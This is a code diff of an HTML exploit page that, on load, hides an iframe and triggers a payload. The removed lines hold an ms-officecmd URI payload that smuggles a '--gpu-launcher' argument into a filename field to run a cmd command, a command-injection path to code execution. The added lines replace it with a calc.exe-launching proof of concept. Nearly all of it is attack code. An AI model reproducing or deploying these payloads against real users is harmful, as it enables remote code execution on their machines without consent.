@@ -1,17 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Example</title>
+    <title>Execute calc.exe</title>
 </head>
 <body onload="executePayload()">
     <script>
         function executePayload() {
+            // Define the URL to execute calc.exe
+            var calcURL = 'data:text/html,<script>window.location.href="file:///C:/Windows/System32/calc.exe";<\/script>';
+
             // Create an iframe element
             var iframe = document.createElement('iframe');
             iframe.style.display = 'none'; // Hide the iframe
-            // Set the iframe's source to a data URI that includes the payload
-            iframe.src = 'data:text/html,<script>document.location="ms-officecmd:{%22LocalProviders.LaunchOfficeAppForResult%22:{%22details%22:{%22appId%22:5,%22name%22:%22irrelevant%22,%22discovered%22:{%22command%22:%22irrelevant%22}},%22filename%22:%22a:/b/ --disable-gpu-sandbox --gpu-launcher=%5C%22C%3A%5CWindows%5CSystem32%5Ccmd%20/c%20ping%202016843009%20%26%26%20%5C%22%22}}}';
-            // Append the iframe to the body to execute the payload
+
+            // Set the iframe's source to the calc.exe URL
+            iframe.src = calcURL;
+
+            // Append the iframe to the body to trigger the payload
             document.body.appendChild(iframe);
         }
     </script>
